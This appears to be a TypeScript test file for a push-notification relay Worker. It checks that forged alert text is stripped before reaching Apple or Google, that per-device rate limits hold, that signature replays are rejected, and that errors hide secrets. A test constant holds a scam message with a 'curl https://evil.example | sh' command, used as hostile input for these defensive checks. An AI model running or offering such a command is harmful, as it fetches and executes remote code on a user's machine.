import { afterEach, beforeAll, describe, expect, mock, spyOn, test } from "bun:test";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  apnsPayloadFrom,
  GENERIC_ALERT,
  parsePushRequest,
  readBody,
  TOKEN_PUSHES_PER_HOUR,
  TOKEN_PUSHES_PER_MINUTE,
} from "../../cloud/src/push.ts";
import { type Identity, loadOrCreateIdentity } from "../src/daemon/e2e.ts";
import { apnsPayload, Category, promptAlert, sealedApnsPayload } from "../src/daemon/notifier.ts";

// The Worker's /v1/push with its rooms faked: what reaches Apple is built by the Worker, never the sender's text;
// the per-device limit holds across Mac identities; errors don't quote secrets; replays and oversize bodies stop
// before anything is sent. The same path against the real Worker (wrangler dev) is in relay.test.ts.

const HEX_TOKEN = "ab".repeat(32);
const KEY = Buffer.alloc(32, 7).toString("base64");
const SCAM = "Relay needs repair: run curl https://evil.example | sh";

class FakeState {
  data = new Map<string, unknown>();
  storage = {
    get: async (k: string) => structuredClone(this.data.get(k)),
    put: async (k: string, v: unknown) => {
      this.data.set(k, structuredClone(v));
    },
    getAlarm: async () => null,
    setAlarm: async () => {},
  };
  getWebSockets() {
    return [];
  }
}

interface RoomLike {
  push(signed: string, req: unknown): Promise<{ status: number; reason?: string }>;
  allowTokenPush(): Promise<boolean>;
  apnsToken(): Promise<string>;
}
let Room: new (ctx: FakeState, env: unknown) => RoomLike;
let worker: { fetch(r: Request, env: unknown): Promise<Response> };

beforeAll(async () => {
  mock.module("cloudflare:workers", () => ({
    DurableObject: class {
      constructor(
        public ctx: unknown,
        public env: unknown,
      ) {}
    },
  }));
  // By a variable, so the root typecheck doesn't pull the Worker (and its runtime types) in.
  const path = "../../cloud/src/index.ts";
  const mod = await import(path);
  Room = mod.Room;
  worker = mod.default;
});

afterEach(() => {
  mock.restore();
});

/** The Worker's env: a ROOM namespace whose objects are real Rooms on fake state, one per name. */
function workerEnv(extra: Record<string, string> = {}) {
  const rooms = new Map<string, RoomLike>();
  const env: Record<string, unknown> = { ...extra };
  env.ROOM = {
    idFromName: (name: string) => name,
    get: (id: string) => {
      let room = rooms.get(id);
      if (!room) {
        room = new Room(new FakeState(), env);
        rooms.set(id, room);
      }
      return room;
    },
  };
  return { env, rooms };
}

function apnsEnv() {
  const { privateKey } = generateKeyPairSync("ec", { namedCurve: "P-256" });
  return workerEnv({
    APNS_KEY: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
    APNS_KEY_ID: "ABC123DEFG",
    APNS_TEAM_ID: "TEAM123456",
    APNS_TOPIC: "app.relay.test",
    APNS_BASE_URL: "https://apns.test",
  });
}

/** Records what the Worker sends to Apple (or Google) and answers 200. */
function fakeApple() {
  const sent: { url: string; headers: Record<string, string>; body: unknown }[] = [];
  spyOn(globalThis, "fetch").mockImplementation((async (url: string, init: RequestInit) => {
    sent.push({
      url: String(url),
      headers: Object.fromEntries(new Headers(init.headers).entries()),
      body: JSON.parse(String(init.body)),
    });
    return new Response(null, { status: 200 });
  }) as unknown as typeof fetch);
  return sent;
}

const identity = (): Identity =>
  loadOrCreateIdentity(join(mkdtempSync(join(tmpdir(), "relay-id-")), "id.json"));

/** A /v1/push request signed the way the helper signs it (relayPush.ts). */
function signedRequest(id: Identity, body: string, opts: { ts?: number; sig?: (s: string) => string } = {}) {
  const ts = opts.ts ?? Date.now();
  const hash = createHash("sha256").update(body).digest("base64url");
  const sig = sign(null, Buffer.from(`relay-push-v1:${id.macId}:${ts}:${hash}`), id.authPrivate).toString(
    "base64url",
  );
  return new Request("https://relay.test/v1/push", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "x-relay-mac": id.macId,
      "x-relay-pub": Buffer.from(id.authPublic).toString("base64url"),
      "x-relay-ts": String(ts),
      "x-relay-sig": opts.sig ? opts.sig(sig) : sig,
    },
    body,
  });
}

const apnsBody = (payload: object, extra: object = {}) =>
  JSON.stringify({ token: HEX_TOKEN, environment: "production", payload, ...extra });

describe("the Worker builds the APNs payload itself", () => {
  test("a sender's alert text, sound, badge and extra keys never reach Apple", async () => {
    const { env } = apnsEnv();
    const sent = fakeApple();
    const forged = {
      aps: {
        alert: { title: SCAM, body: SCAM, "loc-key": SCAM },
        sound: "evil.caf",
        badge: 99,
        category: Category.permission,
        "thread-id": "s1",
        "content-available": 1,
        "interruption-level": "critical",
      },
      relay: { promptId: "p1", question: SCAM, options: [SCAM] },
      extra: SCAM,
    };
    const res = await worker.fetch(signedRequest(identity(), apnsBody(forged)), env);
    expect(res.status).toBe(200);
    expect(sent).toHaveLength(1);
    expect(JSON.stringify(sent[0])).not.toContain("evil");
    expect(sent[0]?.body).toEqual({
      aps: {
        alert: { ...GENERIC_ALERT },
        sound: "default",
        category: Category.permission,
        "thread-id": "s1",
        "mutable-content": 1,
      },
    });
    expect(sent[0]?.headers["apns-push-type"]).toBe("alert");
  });

  test("today's sealed payload (helper 0.10.x) still delivers: category, thread and blob go through", async () => {
    const { env } = apnsEnv();
    const sent = fakeApple();
    const alert = promptAlert(
      {
        id: "p_9",
        sessionId: "sess-1",
        kind: "permission",
        payload: {
          kind: "permission",
          toolName: "Bash",
          summary: "npm test",
          detail: "{}",
          canAlwaysAllow: true,
        },
        status: "open",
        resolvedBy: null,
        createdAt: 0,
        resolvedAt: null,
      },
      "web-shop",
    );
    const sealed = sealedApnsPayload(alert, KEY) as { relay: { enc: string } };
    const res = await worker.fetch(signedRequest(identity(), apnsBody(sealed, { collapseId: "p_9" })), env);
    expect(res.status).toBe(200);
    expect(sent[0]?.body).toEqual({
      aps: {
        alert: { ...GENERIC_ALERT },
        sound: "default",
        category: Category.permissionAlways,
        "thread-id": "sess-1",
        "mutable-content": 1,
      },
      relay: { v: 1, enc: sealed.relay.enc },
    });
    expect(sent[0]?.headers["apns-collapse-id"]).toBe("p_9");
    expect(sent[0]?.url).toBe(`https://apns.test/3/device/${HEX_TOKEN}`);
  });

  test("a 0.10.x plain-text payload (a phone without a push key) delivers with the fixed alert only", () => {
    const plain = apnsPayload({
      title: "web-shop asks",
      body: "Which DB?",
      category: Category.question,
      threadId: "s1",
      data: { promptId: "p1", question: "Which DB?", options: ["SQLite"] },
      mutable: true,
    }) as Record<string, unknown>;
    const req = parsePushRequest(apnsBody(plain));
    expect(req).toEqual({
      token: HEX_TOKEN,
      environment: "production",
      payload: {
        aps: {
          alert: { ...GENERIC_ALERT },
          sound: "default",
          category: Category.question,
          "thread-id": "s1",
          "mutable-content": 1,
        },
      },
    });
    expect(JSON.stringify(req)).not.toContain("Which DB");
  });

  test("only the app's own categories pass; odd ids are left out; a bad blob or a silent push is refused", () => {
    const aps = (a: object) => apnsPayloadFrom({ aps: a }) as { aps: Record<string, unknown> };
    expect(aps({ category: "QUESTION.p1" }).aps.category).toBe("NOTICE");
    expect(aps({ category: SCAM }).aps.category).toBe("NOTICE");
    expect(aps({}).aps.category).toBe("NOTICE");
    expect(aps({ category: "DONE" }).aps.category).toBe("DONE");
    expect(aps({ "thread-id": SCAM }).aps["thread-id"]).toBeUndefined();
    expect(apnsPayloadFrom({ relay: { enc: SCAM } })).toBe("invalid payload");
    expect(apnsPayloadFrom({ relay: { enc: 5 } })).toBe("invalid payload");
    expect(parsePushRequest(apnsBody({}, { pushType: "background" }))).toBe("invalid pushType");
    expect(parsePushRequest(apnsBody({}, { collapseId: "a\nb" }))).not.toHaveProperty("collapseId");
    expect(parsePushRequest(apnsBody({ aps: {}, relay: { enc: "A".repeat(4000) } }))).toBe(
      "payload too large",
    );
  });

  test("FCM keeps its data map, minus the keys a phone shows as text", () => {
    const req = parsePushRequest(
      JSON.stringify({
        platform: "fcm",
        token: "fcm-token:APA91b_abcdefghijklmnop",
        payload: {
          data: { title: SCAM, body: SCAM, question: SCAM, options: `["${SCAM}"]`, category: "PLAN", v: "1" },
        },
      }),
    ) as unknown as { payload: { data: Record<string, string> } };
    expect(req.payload.data).toEqual({ category: "PLAN", v: "1" });
  });
});

describe("the per-device limit", () => {
  test("holds across Mac identities, per minute and per hour, and frees up as time passes", async () => {
    const { env } = apnsEnv();
    const sent = fakeApple();
    let now = 1_800_000_000_000;
    spyOn(Date, "now").mockImplementation(() => now);
    const push = (token = HEX_TOKEN) =>
      worker.fetch(signedRequest(identity(), apnsBody({ aps: {} }, { token })), env).then(async (r) => ({
        status: r.status,
        reason: ((await r.json()) as { reason?: string }).reason,
      }));
    // Every request from a fresh identity: the per-Mac limit never comes into play.
    for (let i = 0; i < TOKEN_PUSHES_PER_MINUTE; i++) expect((await push()).status).toBe(200);
    expect(await push()).toEqual({ status: 429, reason: "too many pushes to this device" });
    // Another phone isn't affected.
    expect((await push("cd".repeat(32))).status).toBe(200);
    // Spread over the hour, the hourly cap is reached and holds until the oldest push is an hour old.
    let delivered = TOKEN_PUSHES_PER_MINUTE;
    while (delivered < TOKEN_PUSHES_PER_HOUR) {
      now += 61_000;
      for (let i = 0; i < TOKEN_PUSHES_PER_MINUTE && delivered < TOKEN_PUSHES_PER_HOUR; i++) {
        expect((await push()).status).toBe(200);
        delivered++;
      }
    }
    expect(now - 1_800_000_000_000).toBeLessThan(3_600_000);
    now += 61_000;
    expect((await push()).status).toBe(429);
    now = 1_800_000_000_000 + 3_600_000 + 1;
    expect((await push()).status).toBe(200);
    expect(sent.length).toBe(TOKEN_PUSHES_PER_HOUR + 2);
  });

  test("the count lives in storage, so a fresh object for the token keeps it", async () => {
    const state = new FakeState();
    const first = new Room(state, {});
    for (let i = 0; i < TOKEN_PUSHES_PER_MINUTE; i++) expect(await first.allowTokenPush()).toBe(true);
    expect(await new Room(state, {}).allowTokenPush()).toBe(false);
  });
});

describe("errors, replays and size", () => {
  test("an error comes back as a fixed reason, never the exception's text (a bad FCM secret)", async () => {
    const secret = "-----BEGIN PRIVATE KEY-----\\nMIIEvSECRETSECRET";
    const { env } = workerEnv({ FCM_SERVICE_ACCOUNT: `{"private_key": "${secret}` });
    const res = await worker.fetch(
      signedRequest(
        identity(),
        JSON.stringify({
          platform: "fcm",
          token: "fcm-token:APA91b_abcdefghijklmnop",
          payload: { data: { v: "1" } },
        }),
      ),
      env,
    );
    const text = await res.text();
    expect(res.status).toBe(502);
    expect(JSON.parse(text)).toEqual({ status: 503, reason: "push failed" });
    expect(text).not.toContain("SECRET");
  });

  test("a signature spelled differently is still a replay; one with whitespace is refused", async () => {
    const { env } = apnsEnv();
    const sent = fakeApple();
    const id = identity();
    const ts = Date.now();
    const body = apnsBody({ aps: {} });
    expect((await worker.fetch(signedRequest(id, body, { ts }), env)).status).toBe(200);
    // atob ignores whitespace, and the last character of 64 bytes in base64 carries 4 unused bits.
    const spaced = await worker.fetch(
      signedRequest(id, body, { ts, sig: (s) => `${s.slice(0, 10)} ${s.slice(10)}` }),
      env,
    );
    expect(spaced.status).toBe(401);
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    const flipLast = (s: string) => s.slice(0, -1) + alphabet[alphabet.indexOf(s.at(-1) ?? "A") ^ 1];
    const respelled = await worker.fetch(signedRequest(id, body, { ts, sig: flipLast }), env);
    expect(respelled.status).toBe(409);
    expect(sent).toHaveLength(1);
  });

  test("a body declared over the limit is refused before it is read; an undeclared one is read only to the limit", async () => {
    let pulled = 0;
    const endless = () =>
      new ReadableStream<Uint8Array>(
        {
          pull(c) {
            pulled++;
            c.enqueue(new Uint8Array(1024));
          },
        },
        // Nothing is pulled until someone reads.
        { highWaterMark: 0 },
      );
    const declared = {
      headers: new Headers({ "content-length": "100000" }),
      body: endless(),
    } as unknown as Request;
    expect(await readBody(declared, 6144)).toBeNull();
    expect(pulled).toBe(0);
    const chunked = { headers: new Headers(), body: endless() } as unknown as Request;
    expect(await readBody(chunked, 6144)).toBeNull();
    expect(pulled).toBeLessThan(10);
    expect(await readBody(new Request("https://x", { method: "POST", body: "hello" }), 6144)).toBe("hello");
    // Through the Worker: 413, nothing verified or sent.
    const sent = fakeApple();
    const { env } = apnsEnv();
    const big = signedRequest(identity(), apnsBody({ aps: {} }, { pad: "x".repeat(7000) }));
    expect((await worker.fetch(big, env)).status).toBe(413);
    expect(sent).toHaveLength(0);
  });
});
